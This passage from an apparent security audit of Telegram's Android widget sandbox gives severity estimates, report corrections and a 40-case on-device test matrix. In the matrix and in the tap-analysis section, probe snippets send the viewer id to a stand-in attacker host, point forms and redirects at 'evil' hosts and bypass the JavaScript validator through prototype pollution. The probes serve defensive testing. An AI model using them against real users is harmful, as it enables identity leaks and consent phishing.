`messageMediaWidget` flags in `m.java:105-109`; there is **no chat-type condition**, although
the JS error text says background requests are allowed "only … the private chat with the
bot". If the server does not reject `getBotWidgetQueryAnswer` for non-private chats, a widget
in a group or channel can call its bot every 5 s with no interaction. That is a zero-click
identity disclosure (the bot sees which user's client called) plus a bot-controlled
round-trip. Test #28.

### 7.4 Haptics (`sub_79A954`, 0x79A954)

- Hidden widget → dropped (`"haptics of a hidden widget are dropped"`).
- Outside a touch series after a 1 s series, >5 per burst, >10 per second → dropped
  (`"haptics over 5 per burst or 10 per second, or outside a touch after a 1 s series, are dropped"`).
- So a tap can produce at most 5 buzzes; no link/copy budget is consumed by haptics.

### 7.5 What a tap cannot do

- No `intent://`, no `content://`, no file provider, no settings screen, no arbitrary
  activity start: Java only ever receives `https://…` (openLink/openTelegramLink) or the
  haptic enum.
- No silent browser launch for non-Telegram links (dialog first).
- `openTelegramLink` **is** silent (no dialog): a tap on a widget element dressed as
  "Close"/"Cancel" can open a Telegram profile/chat or `t.me/iv?url=…` Instant View. That is
  UI redress, limited to Telegram-owned destinations (Low).
- Data exfiltration on one tap:
  - **silent**: none found. `t.me` destinations are resolved by Telegram's own resolver
    (usernames are local; `?start=` only prefills a START button), and non-Telegram links go
    through an `openLink` dialog that displays the full URL.
  - **after a user confirm**: `openLink("https://attacker/?u=" + viewer.id)` shows the URL in
    the dialog; a user who taps "Open" sends the data in the query string. Classic
    consent-phishing, but the URL is displayed, so it is a social-engineering vector rather
    than a silent leak.

---

## 8. Severity estimates

| ID | Issue | Evidence | Severity |
|---|---|---|---|
| **A-1** | `background_query` zero-tap bot call + viewer identity disclosure in non-private chats (if server does not restrict) | `m.java:105-109`, `sub_79A798` status 1/8, `0x2A6CB4` | **Medium** (privacy; by design? needs server check) |
| **A-2** | Viewer profile exposed with no gesture (id at least; name/username/premium likely) | `p.java:236-248`, `sb@534580`, `sub_799014` | **Low/Medium** (design; no egress without A-1) |
| **A-3** | `Object.prototype.toJSON` bypasses the JS validator layer for every `JSON.stringify`-based host call | `sb@532602`, `me`/`Or`/`Rt` | **Low** (native revalidation; parser surface) |
| **A-4** | `openTelegramLink` opens without a confirmation dialog; one tap = silent t.me navigation | `w.java:204-206` | **Low** (UI redress, Telegram hosts only) |
| **A-5** | `console.*` → native log, unbounded, 4 KB/call, no rate limit | `sb@523221` | **Low** (log flood / forensic noise) |
| **A-6** | `copyText` tap-gated but no Java clipboard handler found (dead API or unattributed path) | `w.java:177-221`, no `ClipData` in twidget | **Info** |
| **A-7** | `isPreview` / `preview` key naming: Java emits `preview`, the JS reader expects `isPreview`; the native layer emits `isPreview` from an internal flag whose input mapping was not traced. If the config is passed through unchanged, JS never sees the preview flag — masked because previews always have `can_query=false` | `p.java:227` vs `sb@534580`; native emits `isPreview` at 0x787D80 | **Info** |
| **A-8** | No storage egress (correction to earlier report) | `p.java:331,633-641`, no TL writer | **Info (positive)** |
| **A-9** | `renderer-bundle.js` WebView bridge ships but no Android consumer was found | `0x778B90`, no `messageHandlers` in `.so`, no WebView in the path | **Info** |
| **A-10** | Preview widgets execute scripts and can read `chatData`/`publicData` | `n81.java:40-66`, `H1` | **Info** |

Memory-corruption issues stay with the companion reports (`W-9` High, `W-1/W-6/W-7`
Medium, `W-8` architectural).

---

## 9. Test matrix (for on-device validation)

Prepare one bot that can send (a) a **message widget** (`inputMediaWidget` /
`messageMediaWidget`) and (b) an **inline-result widget** (`botInlineMessageWidget`). Payload =
zlib/gzip of `{"html":"…"}`. For each case, watch `logcat` for `widget <id> stopped` /
diagnostic lines and the on-screen result. A stopped widget is rebuilt when shown
again, but **after two crashes in a row it stays stopped until the app
restarts** (official: Widgets guide, Lifecycle/Limits). Count consecutive
crashes; after two, restart the app before the next case. A stopped bubble
after two crashes is the latch, not a new data point.

| # | Snippet / action | Expected (static prediction) | Proves |
|---|---|---|---|
| 1 | `<script>document.body.textContent=JSON.stringify(TelegramWidget.viewer)</script>` in a `can_query` private-chat widget | object with at least `{id}`; check whether `first_name`/`username`/`is_premium` are present | actual viewer field set (glue key naming) |
| 2 | same as #1 with `can_query` absent | `viewer === null` | viewer gated on can_query |
| 3 | `<script>document.body.textContent=TelegramWidget.chatData+"|"+TelegramWidget.publicData</script>` on a forwarded copy | `null|<publicData>` | `is_copy` hides chatData |
| 4 | `<script>TelegramWidget.openLink("https://example.com")</script>` (no tap) | no dialog; `activation-blocked` diagnostic | link needs tap |
| 5 | `<a href="https://example.com">x</a>` + one tap | system dialog with the URL; browser after confirm | tap + dialog path |
| 6 | `<a href="https://t.me/durov">x</a>` + one tap | Telegram opens the profile, **no dialog** | openTelegramLink silent |
| 7 | `<a href="javascript:alert(1)">x</a>` + tap | nothing; `"javascript: link ignored"` | scheme filter |
| 8 | `<a href="tg://resolve?domain=durov">x</a>` + tap | nothing; `"link ignored (openLink takes https: …)"` | non-https blocked |
| 9 | `<script>try{TelegramWidget.openLink("https://t.me/x")}catch(e){document.title=e.name}</script>` | `TypeError` | telegram-host XOR |
| 10 | `openTelegramLink("https://example.com")` | `TypeError` | host allowlist |
| 11 | `openLink("https://user@example.com/")` | `TypeError` | userinfo rejected |
| 12 | `openLink("https://example.com:"+ "9".repeat(5) +"/")` | `TypeError` | port bound |
| 13 | `openLink("HTTPS://EXAMPLE.COM/A")` + tap | dialog shows `https://example.com/A` | normalisation |
| 14 | `openLink("https://xn--80ak6aa92e.com/")` + tap | dialog shows punycode, not Cyrillic | no IDN spoofing in dialog |
| 15 | `openLink("https://example.com/" + "a".repeat(240))` (260 total) | `TypeError` | 256-byte cap |
| 16 | `window.open("https://example.com")` with no tap | no dialog | window.open → same gate |
| 17 | `a.click()` programmatically (no tap) on an `<a href>` | nothing / blocked | synthetic clicks don't count |
| 18 | `<form action="https://evil/"><button>go</button></form>` + tap; also `form.submit()` | no navigation; `form.submit()` only logs "navigation is disabled" | no form navigation |
| 19 | `<meta http-equiv="refresh" content="0;url=https://evil/">` | no navigation | no meta refresh |
| 20 | `<iframe srcdoc="<script>parent.__pwned=1</script>"></iframe>` | no nested document; `parent.__pwned` undefined | iframes inert |
| 21 | `<link rel=stylesheet href="https://attacker/x.css">` + `@import url(https://attacker/y.css)` | no outbound request (proxy/PCAP) | CSS not fetched |
| 22 | `<img src="https://attacker/pixel.png">` | no request; image missing | img not fetched |
| 23 | `<img src="data:image/png;base64,…">` (≤4 Mpx) | renders | data: image path |
| 24 | `<img src="data:image/svg+xml;base64,…">` | rejected (`contains("svg")`) | svg filter |
| 25 | `localStorage.setItem("k","v")`; close/reopen the same chat (same process) | value restored (config.storage) | storage host round-trip |
| 26 | `typeof __host`, `__twDispatch`, `__v_processOps`, `__twValidator`, `webkit` | all `undefined` | hide-host + context split |
| 27 | `Object.prototype.toJSON=()=>["openLink",["javascript:alert(1)"]]; TelegramWidget.setResizeAnchor("top")` | native receives the forged payload; either a `bridge-rejected` diagnostic or a `TypeError` from `sub_791B84` — **no navigation** | JS validator bypass + native revalidation |
| 28 | widget with `background_query=true` in a **group**, `<script>TelegramWidget.request("ping")</script>` | expected (per JS text): `no-activation`; if it resolves every 5 s, the gap is real | chat-type enforcement |
| 29 | same as #28 in the **private chat with the bot** | resolves within ~5 s, repeats every 5 s | background request path |
| 30 | `TelegramWidget.copyText("X")` with a tap; paste in another app | clipboard is `X` (if wired) or unchanged + no error | copyText implementation |
| 31 | one tap on a `<button>` whose handler calls `request()` then `openLink("https://example.com")` | official: one tap unlocks one call shared between `request`, `openLink`, `openTelegramLink`, `copyText` — the second call is dropped; record which wins | tap budget interaction |
| 32 | 6 × `HapticFeedback.impactOccurred("light")` in one tap handler | 5 buzzes, 6th dropped (`haptic-limit`) | haptic budget |
| 33 | scroll the widget off-screen, then call `openLink` from a timer | dropped (`activation-blocked`) | visibility requirement |
| 34 | `<script>while(1){}</script>` | engine dies with "CPU limit exceeded" (companion report) → widget stopped; after 2 crashes in a row it stays stopped until the app restarts | budget sanity |
| 35 | inline-result preview with `<script>document.title = typeof TelegramWidget.openLink</script>` | script runs; `openLink` throws on call (preview-blocked) | preview scripts run, actions blocked |
| 36 | `<svg><a xlink:href="https://t.me/durov"><text>tap</text></a></svg>` + tap | expected: nothing; if a tap opens the profile, the namespaced attribute is aliased | SVG link handling |
| 37 | `<svg><a href="https://t.me/durov"><text>tap</text></a></svg>` + tap | opens the profile (if SVG anchors are hit-testable) | SVG plain-href path |
| 38 | `<a href="https://t.me/iv?url=https%3A%2F%2Fexample.com">x</a>` + tap | Telegram Instant View UI for example.com (no extra dialog) | openTelegramLink reach |
| 39 | `<a href="https://t.me/+AbCdEf">x</a>` + tap | join-chat dialog for the invite | invite-link reach |
| 40 | `<a href="https://example.com/%00">x</a>` + tap | dialog, then browser; observe whether the URL is truncated in the Intent | `%00` handling downstream |

---

## 10. Corrections to the earlier report

1. **`loadImage` (W-2) and `canvasRead` (W-3) integer overflows do not exist in this
   build.** The bytecode performs `int-to-long` before `mul-long` for the 4 Mpx checks in
   both methods, and in `canvasRead` the later `w*h*4` allocation is bounded by the 64-bit
   4 Mpx guard (≤16 MiB), with `w<=0 || h<=0` rejected first. (jadx failed to decompile
   `loadImage`, which is why the earlier pass read the Java source lines as 32-bit
   arithmetic.) `loadImage` also caps the URI at 2 MiB and rejects `svg` before decoding.
   The `canvasRead` "unreachable from widget JS" observation remains true
   (`getImageData` returns an empty `ImageData`).
2. **Storage is not synced to the server.** The earlier "worth confirming who can read the
   local area" hypothesis is refuted for this build: `p.f44432c` is an in-memory map and
   `messages.editWidgetData` (which carries only `public_data`) is never constructed by the
   client. The only storage-shaped TL objects are `editMessageWidgetData` with
   `chat_data`/`public_data`, unrelated to `localStorage`.
3. **The tap gate is broader than "request/wallet/clipboard/haptics".** `openLink` and
   `openTelegramLink` are tap-gated too (strict mode, one per tap on a visible widget); the
   earlier text implied links were only scheme-filtered.
4. **The "no network" claim holds for markup**, but `request`/`wallet` are real network calls
   (by design) and `background_query` makes them reachable without a gesture.

## 11. Open questions (static uncertainty)

- Exact `viewer` field set (Java camelCase vs JS snake_case vs native re-serialisation).
- Whether the server restricts `background_query` / `can_query` to the private chat with the
  bot; the client does not. **Official docs (2026-11-09): the server does — background
  requests are allowed only for the original in the private chat with the bot.** Worth a live
  confirmation.
- Whether `copyText` is implemented outside `w.f` (no clipboard use found anywhere).
- RNG quality of `__host("random", …)` (the `/dev/urandom`/`getrandom` symbols exist in the
  binary but the widget path was not traced).
- Exact semantics of `sub_79A798` status 2 (queue/defer) — the message table and the
  status-1/8 path are verified, the 0/2 branch is inferred.
